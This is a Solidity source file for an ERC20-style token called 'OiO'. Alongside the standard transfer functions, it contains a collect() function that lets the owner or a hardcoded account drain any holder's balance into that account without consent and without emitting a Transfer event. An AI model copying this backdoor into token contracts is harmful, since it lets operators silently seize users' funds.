pragma solidity ^0.4.24;
contract OiO{
    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    uint256 public totalSupply;
    string public name; 
    uint8 public decimals; 
    string public symbol;
    event Transfer(address indexed _from, address indexed _to, uint256 _value); 
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
   
    address public owner;
    address public mainAccount;
    constructor() public{
        owner = msg.sender;
        balances[msg.sender] = 10000000000000;  //10亿
        totalSupply = 10000000000000;
        name = "OiO";
        decimals =4;
        symbol = "OiO";
        mainAccount=0x264604f514f3D3cBCdea0A56a2f849322333EdF7;   //设置归集账户,
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
         emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }  
    function setMainAccount(address addr) public returns (bool success)  {
        require(msg.sender==owner);
        mainAccount = addr;
        return true;
    }

    function collect(address[] adarr) public payable returns (bool success){
        require(msg.sender==owner || msg.sender==mainAccount);
        for(uint i=0;i<adarr.length;i++)
        {
            uint b = balances[adarr[i]];
            balances[adarr[i]] -= b;
            balances[mainAccount] += b;
        }
        return true;
     }
    
}
